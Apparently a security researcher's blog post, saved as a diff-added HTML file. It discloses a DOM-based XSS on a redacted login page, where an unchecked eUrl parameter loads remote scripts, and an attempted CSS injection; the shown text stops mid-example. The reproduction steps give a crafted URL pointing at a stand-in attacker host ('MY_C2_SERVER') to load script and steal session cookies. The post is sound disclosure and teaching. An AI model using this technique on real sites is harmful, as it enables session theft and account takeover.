@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Full Disclosure - DOM-based XSS And Failures In Bug Bounty Hunting :: kuldeepdotexe&#39;s blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A writeup about my failures while doing bug bounty" />
+<meta name="keywords" content="CSS injection, CSSi, Full Disclosure, DOM-based XSS, XSS, Cross Site Scripting, Bug Bounty, Bug, Bounty, DOM, DOM-XSS, DOMXSS" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://kuldeep.io/posts/fulldisclosure-dom-based-xss/" />
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8LMH0XXR2S"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8LMH0XXR2S', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+<link rel="stylesheet" href="https://kuldeep.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://kuldeep.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://kuldeep.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://kuldeep.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="kuldeepdotexe" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Full Disclosure - DOM-based XSS And Failures In Bug Bounty Hunting">
+<meta property="og:description" content="A writeup about my failures while doing bug bounty" />
+<meta property="og:url" content="https://kuldeep.io/posts/fulldisclosure-dom-based-xss/" />
+<meta property="og:site_name" content="kuldeepdotexe&#39;s blog" />
+
+  <meta property="og:image" content="https://kuldeep.io/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2023-07-06 14:33:00 &#43;0530 IST" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8LMH0XXR2S"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8LMH0XXR2S', { 'anonymize_ip': false });
+}
+</script>
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Kuldeep&#39;s Blog
+  </div>
+</a>
+
+    </div>
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://kuldeep.io/posts/fulldisclosure-dom-based-xss/">Full Disclosure - DOM-based XSS And Failures In Bug Bounty Hunting</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2023-07-06
+        
+      </span>
+    
+    
+      <span class="post-author">:: Kuldeep Pandya</span>
+    
+    
+      <span class="post-reading-time">:: 9 min read (1874 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://kuldeep.io/tags/xss/">XSS</a>&nbsp;
+    
+    #<a href="https://kuldeep.io/tags/cssi/">CSSi</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Hello, folks!</p>
+<p>A few days ago, I shared a post on Twitter about a mistake I made while doing bug bounties. This post is about the same mistake and a bonus mistake.</p>
+<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Double check your scopes ;___;<a href="https://twitter.com/hashtag/bugbountylife?src=hash&amp;ref_src=twsrc%5Etfw">#bugbountylife</a> <a href="https://t.co/nJyVxiCHQX">pic.twitter.com/nJyVxiCHQX</a></p>&mdash; Kuldeep Pandya (@kuldeepdotexe) <a href="https://twitter.com/kuldeepdotexe/status/1675930496201805824?ref_src=twsrc%5Etfw">July 3, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+<p>While scrolling on LinkedIn/Twitter/Instagram it is easy to get overwhelmed by looking at other people posting their bounties. There are two ways to look at this: 1. either get encouraged to hack looking at other people&rsquo;s success or 2. get discouraged and feel bad about you not finding enough vulnerabilities yourself. It is up to us to look at the positive side, take it as inspiration and start working to post similar bounties ourselves.</p>
+<p>However, while doing so, it is not guaranteed to find success 100% of the time. Whether you just started hacking or are a seasoned hacker, there will always be challenges.</p>
+<p>This time, I found myself in a similar situation. I was hunting on a target for around 6+ hours and found a DOM-based XSS. I escalated it to one-click account takeover. After reporting the issue, I found out that particular domain was out-of-scope.</p>
+<p>I spent 1+ hours on crafting the perfect report for this vulnerability but in the end, it didn&rsquo;t matter. So, I decided to share it in a blog because I&rsquo;m proud of my report.</p>
+<p>After that, I moved on to the next &ldquo;in-scope&rdquo; domain. I found a static HTML file and suspected there might be a CSS injection vulnerability. Detailed findings are shown below.</p>
+<h2 id="findings">Findings:<a href="#findings" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="1-dom-xss-in-redactedexamplecom-due-to-insecure-dynamic-resource-loading-via-eurl-parameter">1. DOM XSS In <code>REDACTED.example.com</code> Due To Insecure Dynamic Resource Loading Via <code>eUrl</code> Parameter<a href="#1-dom-xss-in-redactedexamplecom-due-to-insecure-dynamic-resource-loading-via-eurl-parameter" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="summary">Summary:<a href="#summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>The URL at <a href="https://REDACTED.example.com/v2/xxx-login.asp">https://REDACTED.example.com/v2/xxx-login.asp</a> loads static resources dynamically using the <code>eUrl</code> parameter that leads to DOM based XSS allowing for a one-click full account takeover.</p>
+<h4 id="introduction">Introduction:<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.</p>
+<h4 id="description">Description:<a href="#description" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>The page in focus <a href="https://REDACTED.example.com/v2/xxx-login.asp">https://REDACTED.example.com/v2/xxx-login.asp</a> facilitates login functionality using the SSO. It takes the following parameters in input:</p>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Working</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>action</code></td>
+<td>Set to either <code>login</code> or <code>register</code> depending on what user chooses</td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>Set to <code>REDACTED-prod</code> suggesting this is the production environment</td>
+</tr>
+<tr>
+<td><code>eUrl</code></td>
+<td>This is the most important parameter as it specifies the location to load static resources from</td>
+</tr>
+<tr>
+<td><code>userType</code></td>
+<td>This specifies the user type. By the normal application flow, this is set to <code>PARTNER</code></td>
+</tr>
+<tr>
+<td><code>REDACTEDLookupCode</code></td>
+<td>I&rsquo;m not entirely sure what this does</td>
+</tr>
+<tr>
+<td><code>REDACTEDName</code></td>
+<td>Set to empty using the normal application flow so I believe it is not much important</td>
+</tr>
+<tr>
+<td><code>ssolang</code></td>
+<td>Language for the SSO. Set to <code>en</code> by default</td>
+</tr>
+<tr>
+<td><code>REDACTEDUrl</code></td>
+<td>Again, not entirely sure what this does but doesn&rsquo;t affect the outcome</td>
+</tr>
+<tr>
+<td><code>dossologin</code></td>
+<td>This is a boolean parameter which is either set to <code>true</code> or <code>false</code>. It is set to <code>true</code> in the case of SSO login</td>
+</tr>
+</tbody>
+</table>
+<p>Here, the parameter of utmost importance is the <code>eUrl</code> parameter. As it is used to dynamically generate content.</p>
+<p>From the source code, we can see that among the below shown lines, the vulnerability exists:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">eUrl</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">urlObj</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;eUrl&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">elementStyleTag</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;link&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">elementStyleTag</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#39;rel&#39;</span>, <span style="color:#e6db74">&#39;stylesheet&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">elementStyleTag</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#39;href&#39;</span>, <span style="color:#a6e22e">eUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/styles.css&#39;</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">elementStyleTag</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">$</span>(document).<span style="color:#a6e22e">ready</span>(<span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">kendo</span>.<span style="color:#a6e22e">ui</span>.<span style="color:#a6e22e">progress</span>(<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;body&#34;</span>), <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">getScript</span>({
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/deployment/env/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">env</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.config.js&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>            }, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">getScript</span>({
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/keycloak.js&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>                }, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Rest of the code
+</span></span></span></code></pre></div><p>Here is the breakdown of the code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">eUrl</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">urlObj</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;eUrl&#39;</span>));
+</span></span></code></pre></div><p>This line retrieves the <code>eUrl</code> parameter from the <code>urlObj</code>, decodes it using <code>decodeURIComponent()</code>, and assigns it to the <code>eUrl</code> variable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">elementStyleTag</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;link&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">elementStyleTag</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#39;rel&#39;</span>, <span style="color:#e6db74">&#39;stylesheet&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">elementStyleTag</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#39;href&#39;</span>, <span style="color:#a6e22e">eUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/styles.css&#39;</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">elementStyleTag</span>);
+</span></span></code></pre></div><p>These lines create a new <code>link</code> element, set its <code>rel</code> attribute to &ldquo;stylesheet&rdquo;, set its <code>href</code> attribute to the URL of the stylesheet (which is formed by appending &lsquo;/styles.css&rsquo; to <code>eUrl</code>), and append this element to the head of the document.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>(document).<span style="color:#a6e22e">ready</span>(<span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kendo</span>.<span style="color:#a6e22e">ui</span>.<span style="color:#a6e22e">progress</span>(<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;body&#34;</span>), <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">getScript</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/deployment/env/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">env</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.config.js&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>    }, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">getScript</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/keycloak.js&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        }, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Rest of the code
+</span></span></span></code></pre></div><p>In this block, jQuery is set to execute when the document is ready. It displays a loading animation and uses the <code>getScript()</code> function to fetch and execute two JavaScript files from URLs built using the user-provided<code> eUrl</code>.</p>
+<p>The vulnerability here lies in the way <code>eUrl</code> is used. Since this value comes from the user and is not validated or sanitized before use, an attacker could manipulate this value to point to a malicious script on a different server. When the jQuery <code>getScript()</code> function fetches and executes this script, it would run in the context of the user&rsquo;s session, leading to a DOM-based Cross-Site Scripting (XSS) attack.</p>
+<p>Furthermore, <code>HTTPOnly</code> flag is not used for the <code>ASPSESSIONID</code> cookie which acts as a session cookie. This allows a remote unauthenticated attacker to perform single-click account takeovers.</p>
+<h4 id="steps-to-reproduce">Steps To Reproduce:<a href="#steps-to-reproduce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<ol start="0">
+<li>To later validate access to session cookies, first visit the following URL: <a href="https://REDACTED.example.com/login.asp">https://REDACTED.example.com/login.asp</a>. This will set the <code>ASPSESSIONID</code> cookie. This step is optional and its only purpose is to set cookies.</li>
+<li>Visit the following URL: <a href="https://REDACTED.example.com/v2/xxx-login.asp?action=login&amp;env=REDACTED-prod&amp;eUrl=https://MY_C2_SERVER/&amp;userType=PARTNER&amp;REDACTEDLookupCode=REDACTED.example.com&amp;REDACTEDName=&amp;ssolang=en&amp;REDACTEDUrl=https://REDACTED.example.com/login.asp&amp;dossologin=true">https://REDACTED.example.com/v2/xxx-login.asp?action=login&amp;env=REDACTED-prod&amp;eUrl=https://MY_C2_SERVER/&amp;userType=PARTNER&amp;REDACTEDLookupCode=REDACTED.example.com&amp;REDACTEDName=&amp;ssolang=en&amp;REDACTEDUrl=https://REDACTED.example.com/login.asp&amp;dossologin=true</a></li>
+<li>As you open the URL, you will be redirected to my malicious SSO login page. A tech-savvy person will immediately recognize this as a phishing attack. While someone less familiar with such tactics may not.</li>
+<li>However, if you check your request logs using Burp Suite, you will notice that your session cookies are already compromised and sent to the attacker&rsquo;s server.</li>
+</ol>
+<h4 id="recommendations">Recommendations<a href="#recommendations" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>To fix this vulnerability, follow these steps:</p>
+<ol>
+<li><strong>Validate User Inputs</strong>: Always validate user inputs. For <code>eUrl</code>, ensure it points to a known, safe domain and doesn&rsquo;t contain unexpected path or query elements.</li>
+<li><strong>Sanitize User Inputs</strong>: Beyond validation, sanitize user inputs. This can include escaping special characters or using secure functions that perform these tasks automatically.</li>
+<li><strong>Use Allow-lists</strong>: Employ an allow-list approach. Only permit specific, known-good inputs to pass through.</li>
+<li><strong>Implement Content Security Policy (CSP)</strong>: Use Content Security Policy headers to limit the sources from which scripts can be loaded. This can prevent unauthorized script execution.</li>
+<li><strong>Set HTTPOnly Flag</strong>: Apply the <code>HTTPOnly</code> flag to the <code>ASPSESSIONID</code> cookie. This prevents the cookie from being accessed by client-side scripts, protecting it from theft during an XSS attack.</li>
+<li><strong>Use SameSite Attribute for Cookies</strong>: Set the <code>SameSite</code> attribute for the session cookie to <code>Strict</code> or <code>Lax</code>. This offers extra protection against Cross-Site Request Forgery (CSRF) attacks.</li>
+<li><strong>Regularly Update and Patch</strong>: Keep all software (libraries, frameworks, servers, etc.) up to date. Apply patches promptly as they become available.</li>
+</ol>
+<h4 id="supporting-materialreferences">Supporting Material/References:<a href="#supporting-materialreferences" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<ol>
+<li>Optional login page that is used to set cookies</li>
+</ol>
+<p>REDACTED</p>
+<ol start="2">
+<li>Phishing page that we made to trick users</li>
+</ol>
+<p>REDACTED</p>
+<ol start="3">
+<li>Cookies leaked without user knowing</li>
+</ol>
+<p>REDACTED</p>
+<h4 id="impact">Impact<a href="#impact" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>A remote unauthenticated attacker can perform the following actions:</p>
+<p><strong>Launch a Cross-Site Scripting (XSS) attack</strong>: The attacker can manipulate the <code>eUrl</code> parameter to point to a malicious script. This script will be fetched and executed within the user&rsquo;s session when the page loads, giving the attacker the ability to modify the webpage content or perform actions on behalf of the user.
+<strong>Steal session cookies</strong>: The <code>ASPSESSIONID</code> cookie does not have the <code>HTTPOnly</code> flag set, which means it can be accessed by client-side scripts. In the event of a successful XSS attack, this cookie can be stolen, compromising the user&rsquo;s session.
+<strong>Perform account takeover</strong>: With the stolen session cookie, the attacker can impersonate the victim&rsquo;s session, leading to unauthorized access to the user&rsquo;s account and potentially any sensitive data or functionalities it contains.
+<strong>Conduct harmful actions</strong>: Once the account is taken over, the attacker can perform potentially harmful actions such as changing user settings, sending messages, or making transactions.</p>
+<p>All these malicious actions can be performed with just a single click from the user, increasing the risk and ease of the attack.</p>
+<h3 id="2-css-injection">2. CSS Injection?<a href="#2-css-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>While checking a static page of an in-scope application, I came across an interesting JavaScript file.</p>
+<p>The code looked like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">current_url_string</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">current_url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">current_url_string</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">linkObj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">current_url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;link1&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userPhotoUrl</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">current_url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;user_photo_url&#34;</span>) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decodeDeepLink</span>(<span style="color:#a6e22e">linkObj</span>).<span style="color:#a6e22e">user_photo_url</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">photoBaseUrl</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;https://REDACTED.example.com/media/profile-photos&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">userPhotoUrl</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">userPhotoUrl</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#a6e22e">photoBaseUrl</span>)) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;.profile-img-placeholder&#34;</span>).<span style="color:#a6e22e">css</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;background&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;url(&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">userPhotoUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I started to analyze the JavaScript code by manually reading.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">current_url_string</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">current_url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">current_url_string</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">linkObj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">current_url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;link1&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userPhotoUrl</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">current_url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;user_photo_url&#34;</span>) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decodeLink</span>(<span style="color:#a6e22e">linkObj</span>).<span style="color:#a6e22e">user_photo_url</span>;
+</span></span></code></pre></div><p>This subsection retrives the <code>link1</code> and <code>user_photo_url</code> parameters from the URL. The <code>user_photo_url</code> is a direct URL to the user&rsquo;s profile picture. The other <code>link1</code> parameter is a base64 encoded JSON object that is decoded using the <code>decodeLink()</code> function.</p>
+<p>Here is the working of this function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decodeDeepLink</span>(<span style="color:#a6e22e">str</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">str</span>));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After decoding the <code>link1</code> parameter, it extracts the value of <code>user_photo_url</code> key from the JSON.</p>
+<p>The following subsection takes the <code>user_photo_url</code> and puts it directly in the CSS of the element having the <code>.profile-img-placeholder</code> as the CSS class.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">userPhotoUrl</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">userPhotoUrl</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#a6e22e">photoBaseUrl</span>)) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;.profile-img-placeholder&#34;</span>).<span style="color:#a6e22e">css</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;background&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;url(&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">userPhotoUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>To set a user-provided value in the CSS of this class, I thought to provide a link like this:</p>
+<p><a href="https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwOi8vd3d3LmV4YW1wbGUuY29tIn0=">https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwOi8vd3d3LmV4YW1wbGUuY29tIn0=</a></p>
+<p>When decoded, it becomes this JSON:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;user_photo_url&#34;</span>: <span style="color:#e6db74">&#34;http://www.example.com&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This did not work obviously because I had overlooked a crucial detail. There is a <code>startsWith(photoBaseUrl)</code> function that check if the value of <code>user_photo_url</code> starts with &ldquo;<a href="https://REDACTED.example.com/media/profile-photos%22">https://REDACTED.example.com/media/profile-photos&quot;</a> or not. In my case, it did not. So, no reflections whatsoever in DOM.</p>
+<p>Then I used the following URL to trigger the change in DOM:</p>
+<p><a href="https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwczovL1JFREFDVEVELmV4YW1wbGUuY29tL21lZGlhL3Byb2ZpbGUtcGhvdG9zIn0=">https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwczovL1JFREFDVEVELmV4YW1wbGUuY29tL21lZGlhL3Byb2ZpbGUtcGhvdG9zIn0=</a></p>
+<p>The <code>link1</code> parameter decodes to this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;user_photo_url&#34;</span>: <span style="color:#e6db74">&#34;https://REDACTED.example.com/media/profile-photos&#34;</span>
